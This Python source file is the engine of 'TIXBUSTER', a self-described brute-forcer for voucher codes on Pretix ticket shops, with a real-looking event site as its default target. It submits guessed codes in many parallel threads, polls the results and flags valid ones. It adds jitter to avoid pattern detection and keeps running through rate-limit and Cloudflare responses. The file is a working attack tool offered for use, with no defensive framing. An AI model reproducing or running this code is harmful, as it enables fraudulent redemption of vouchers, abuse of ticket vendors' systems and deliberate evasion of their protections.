"""
Core voucher testing logic for TIXBUSTER
Pretix voucher code bruteforcer engine
"""

import requests
import time
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed


class VoucherTester:
    """Core voucher testing engine"""

    def __init__(self, base_url="https://tix.darkprague.com", verbose=False, threads=1):
        self.base_url = base_url
        self.verbose = verbose
        self.threads = threads
        self.rate_limited = False
        self.request_count = 0
        self.start_time = datetime.now()
        self.tested_codes = set()
        self.lock = threading.Lock()  # Thread-safe result aggregation

    def adaptive_delay(self):
        """Calculate adaptive delay based on request rate"""
        with self.lock:
            self.request_count += 1
            count = self.request_count

        # Base delay
        delay = 0.5

        # Increase delay if we've made many requests
        if count > 100:
            delay = 1.0
        if count > 200:
            delay = 2.0

        # Per-thread rate limiting: distribute delay across threads
        delay = delay / self.threads

        # Add jitter to avoid pattern detection
        delay += random.uniform(0, 0.3)

        return delay

    def check_rate_limit(self, response):
        """Check if we're being rate limited"""
        if response.status_code == 429:
            self.rate_limited = True
            return True

        # Check for rate limit headers
        if 'X-RateLimit-Remaining' in response.headers:
            remaining = int(response.headers['X-RateLimit-Remaining'])
            if remaining < 5:
                if self.verbose:
                    print(f"[!] Rate limit warning: {remaining} requests remaining")
                return True

        # Check for Cloudflare challenges
        if response.status_code == 403 or 'cf-ray' in response.headers:
            if 'challenge' in response.text.lower():
                if self.verbose:
                    print("[!] Cloudflare challenge detected")
                return True

        return False

    def test_voucher(self, voucher_code, session, csrf_token):
        """Test a single voucher code"""
        if self.verbose:
            print(f"\n[TEST] Testing voucher: {voucher_code}")

        try:
            # Prepare request
            boundary = '----WebKitFormBoundaryb7D46i8XRHNyyJNR'
            data = (
                f'------WebKitFormBoundaryb7D46i8XRHNyyJNR\r\n'
                f'Content-Disposition: form-data; name="csrfmiddlewaretoken"\r\n\r\n'
                f'{csrf_token}\r\n'
                f'------WebKitFormBoundaryb7D46i8XRHNyyJNR\r\n'
                f'Content-Disposition: form-data; name="voucher"\r\n\r\n'
                f'{voucher_code}\r\n'
                f'------WebKitFormBoundaryb7D46i8XRHNyyJNR\r\n'
                f'Content-Disposition: form-data; name="ajax"\r\n\r\n'
                f'1\r\n'
                f'------WebKitFormBoundaryb7D46i8XRHNyyJNR--\r\n'
            ).encode()

            # Submit voucher
            response = session.post(
                f'{self.base_url}/cart/voucher',
                data=data,
                headers={'Content-Type': f'multipart/form-data; boundary={boundary}'},
                timeout=10
            )

            # Check for rate limiting
            if self.check_rate_limit(response):
                self.rate_limited = True
                if self.verbose:
                    print(f"[RESULT] RATE_LIMITED")
                return 'RATE_LIMITED', None

            if response.status_code == 200:
                result = response.json()

                # Get async_id (check both redirect and direct field)
                async_id = None
                if 'redirect' in result and 'async_id=' in result['redirect']:
                    async_id = result['redirect'].split('async_id=')[1].split('&')[0]
                elif 'async_id' in result:
                    async_id = result['async_id']

                if self.verbose and async_id:
                    print(f"[POST] Status: {response.status_code}, async_id: {async_id}")

                if async_id:
                    # Wait with adaptive delay
                    time.sleep(self.adaptive_delay())

                    # Poll for result
                    poll_response = session.get(
                        f'{self.base_url}/cart/voucher',
                        params={'async_id': async_id, 'ajax': '1'},
                        timeout=10
                    )

                    if poll_response.status_code == 200:
                        poll_result = poll_response.json()

                        if self.verbose:
                            print(f"[POLL] Status: {poll_response.status_code}, ready: {poll_result.get('ready')}")

                        # Analyze response
                        if poll_result.get('success'):
                            if self.verbose:
                                print(f"[RESULT] SUCCESS - {poll_result}")
                            return 'SUCCESS', poll_result

                        message = poll_result.get('message', '')

                        # Enhanced categorization based on actual messages
                        if 'expired' in message.lower():
                            if self.verbose:
                                print(f"[RESULT] EXPIRED - {message}")
                            return 'EXPIRED', async_id
                        elif 'not known in our database' in message.lower():
                            if self.verbose:
                                print(f"[RESULT] NOTFOUND (404) - {message}")
                            return 'NOTFOUND', message
                        elif 'invalid' in message.lower() or 'not found' in message.lower():
                            if self.verbose:
                                print(f"[RESULT] INVALID - {message}")
                            return 'INVALID', message
                        elif 'already' in message.lower() or 'used' in message.lower() or 'redeemed' in message.lower():
                            if self.verbose:
                                print(f"[RESULT] USED - {message}")
                            return 'USED', message
                        elif 'limit' in message.lower() or 'maximum' in message.lower():
                            if self.verbose:
                                print(f"[RESULT] LIMITED - {message}")
                            return 'LIMITED', message
                        else:
                            if self.verbose:
                                print(f"[RESULT] UNKNOWN - {message}")
                            return 'UNKNOWN', message

                return 'NO_RESPONSE', None

            if self.verbose:
                print(f"[RESULT] ERROR - Status: {response.status_code}")
            return 'ERROR', response.status_code

        except Exception as e:
            if self.verbose:
                print(f"[RESULT] EXCEPTION - {str(e)}")
            return 'EXCEPTION', str(e)

    def _update_results(self, results, code, status, detail):
        """Thread-safe result update"""
        with self.lock:
            results['tested'] += 1
            self.tested_codes.add(code)

            if status == 'SUCCESS':
                print(f"\n[!!!] VALID CODE FOUND: {code}")
                print(f"      Details: {detail}")
                results['SUCCESS'].append(code)
            elif status == 'EXPIRED':
                results['EXPIRED'].append(code)
                if not self.verbose:
                    print(f"[~] Expired but valid format: {code}")
            elif status == 'USED':
                results['USED'].append(code)
                if not self.verbose:
                    print(f"[~] Already used: {code}")
            elif status == 'LIMITED':
                results['LIMITED'].append(code)
                if not self.verbose:
                    print(f"[~] Limit reached: {code}")
            elif status == 'UNKNOWN':
                results['UNKNOWN'].append(code)
                if not self.verbose:
                    print(f"[?] Unknown response for {code}: {detail}")
            elif status == 'NOTFOUND':
                results['NOTFOUND'].append(code)

    def test_batch(self, codes, session, csrf_token, progress_callback=None):
        """Test a batch of voucher codes (uses threading if threads > 1)"""
        if self.threads > 1:
            return self._test_batch_threaded(codes, session, csrf_token, progress_callback)
        else:
            return self._test_batch_single(codes, session, csrf_token, progress_callback)

    def _test_batch_single(self, codes, session, csrf_token, progress_callback=None):
        """Single-threaded batch testing (original implementation)"""
        results = {
            'SUCCESS': [],
            'EXPIRED': [],
            'USED': [],
            'LIMITED': [],
            'UNKNOWN': [],
            'NOTFOUND': [],
            'tested': 0
        }

        for i, code in enumerate(codes):
            # Skip already tested
            if code in self.tested_codes:
                continue

            # Test the code
            status, detail = self.test_voucher(code, session, csrf_token)
            self._update_results(results, code, status, detail)

            # Just log rate limiting, don't stop
            if status == 'RATE_LIMITED':
                print("[!] Rate limit warning (429/403) - continuing")

            # Progress callback
            if progress_callback:
                progress_callback(i + 1, len(codes), results)

            # Progress indicator for non-verbose mode
            if not self.verbose and (i + 1) % 20 == 0:
                elapsed = (datetime.now() - self.start_time).seconds
                rate = results['tested'] / max(elapsed, 1)
                print(f"\n[*] Progress: {i+1}/{len(codes)} | Rate: {rate:.1f} req/s | Tested: {results['tested']}")

            # Adaptive delay
            time.sleep(self.adaptive_delay())

        return results

    def _test_batch_threaded(self, codes, session, csrf_token, progress_callback=None):
        """Multi-threaded batch testing"""
        results = {
            'SUCCESS': [],
            'EXPIRED': [],
            'USED': [],
            'LIMITED': [],
            'UNKNOWN': [],
            'NOTFOUND': [],
            'tested': 0
        }

        # Filter out already tested codes
        codes_to_test = [c for c in codes if c not in self.tested_codes]
        total_codes = len(codes_to_test)

        if not codes_to_test:
            return results

        print(f"[*] Using {self.threads} threads for parallel testing")

        # Each thread gets its own session (thread-local)
        def test_code_wrapper(code):
            """Wrapper for thread execution"""
            thread_session = requests.Session()
            # Copy cookies from main session
            thread_session.cookies.update(session.cookies)

            status, detail = self.test_voucher(code, thread_session, csrf_token)
            return code, status, detail

        completed = 0
        try:
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                # Submit all jobs
                future_to_code = {
                    executor.submit(test_code_wrapper, code): code
                    for code in codes_to_test
                }

                # Process results as they complete
                for future in as_completed(future_to_code):
                    code = future_to_code[future]
                    try:
                        code, status, detail = future.result()

                        # Update results thread-safely
                        self._update_results(results, code, status, detail)

                        # Just log rate limiting, don't slow down
                        if status == 'RATE_LIMITED':
                            print("[!] Rate limit warning (429/403) - continuing at current speed")

                        completed += 1

                        # Progress indicator
                        if not self.verbose and completed % 20 == 0:
                            elapsed = (datetime.now() - self.start_time).seconds
                            rate = results['tested'] / max(elapsed, 1)
                            print(f"\n[*] Progress: {completed}/{total_codes} | Rate: {rate:.1f} req/s | Tested: {results['tested']}")

                    except Exception as e:
                        print(f"[!] Exception in thread for {code}: {e}")
                        continue

        except KeyboardInterrupt:
            print("\n[!] Interrupted by user, shutting down threads...")
            raise

        return results
